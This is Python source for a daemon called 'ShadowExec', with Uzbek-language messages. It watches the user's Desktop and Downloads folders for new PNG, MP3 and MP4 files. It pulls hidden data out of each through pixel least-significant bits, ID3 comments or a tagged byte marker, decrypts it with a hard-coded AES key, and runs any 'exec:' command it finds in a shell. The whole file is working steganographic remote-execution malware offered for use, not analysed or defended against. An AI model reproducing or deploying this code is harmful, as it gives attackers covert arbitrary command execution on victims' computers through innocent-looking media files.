# shadowexec_daemon.py
import os
import base64
import subprocess
from Crypto.Cipher import AES
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from PIL import Image
from mutagen.mp3 import MP3
from datetime import datetime
import time

#  AES konfiguratsiya
KEY = b"1234567812345678"

WATCH_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Downloads")
]

def decrypt_payload(cipher_b64):
    try:
        cipher_data = base64.b64decode(cipher_b64)
        cipher = AES.new(KEY, AES.MODE_ECB)
        decrypted = cipher.decrypt(cipher_data)
        result = decrypted.decode(errors="ignore")
        if result.startswith("exec:"):
            return result.replace("exec:", "").strip()
    except Exception as e:
        return None
    return None

def extract_from_png(filepath):
    try:
        img = Image.open(filepath)
        binary_data = ""
        for pixel in img.getdata():
            for color in pixel[:3]:
                binary_data += str(color & 1)
        all_bytes = [binary_data[i:i+8] for i in range(0, len(binary_data), 8)]
        data = ""
        for byte in all_bytes:
            char = chr(int(byte, 2))
            data += char
            if data.endswith("EOF"):
                break
        return data.replace("EOF", "")
    except:
        return None

def extract_from_mp3(filepath):
    try:
        audio = MP3(filepath)
        comment = audio.get("comment", [None])[0]
        return comment
    except:
        return None

def extract_from_mp4(filepath):
    try:
        with open(filepath, "rb") as f:
            content = f.read()
        tag = b"HIDDEN_CMD:"
        index = content.find(tag)
        if index != -1:
            hidden = content[index+len(tag):]
            return hidden.decode(errors="ignore").strip()
        return None
    except:
        return None

class StegoHandler(FileSystemEventHandler):
    def on_created(self, event):
        filepath = event.src_path
        ext = filepath.lower().split(".")[-1]

        if not ext in ["png", "mp3", "mp4"]:
            return

        print(f"[🕵️] Yangi fayl topildi: {filepath}")

        if ext == "png":
            secret = extract_from_png(filepath)
        elif ext == "mp3":
            secret = extract_from_mp3(filepath)
        elif ext == "mp4":
            secret = extract_from_mp4(filepath)
        else:
            return

        if not secret:
            print("[❌] Hech qanday yashirin ma'lumot topilmadi.")
            return

        print(f"[🔐] Yashirin topildi: {secret}")

        cmd = decrypt_payload(secret)

        if cmd:
            print(f"[⚡] Buyruq bajarilmoqda: {cmd}")
            subprocess.run(cmd, shell=True)
        else:
            print("[❌] Yaroqli exec: buyruq emas.")

def main():
    print("🧠 ShadowExec Daemon ishga tushdi...")
    print(f"📡 Kuzatuvchilar: {WATCH_DIRS}")

    observer = Observer()
    handler = StegoHandler()
    for path in WATCH_DIRS:
        if os.path.exists(path):
            observer.schedule(handler, path=path, recursive=True)
        else:
            print(f"[⚠️] Yo'q papka: {path}")

    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

if __name__ == "__main__":
    main()
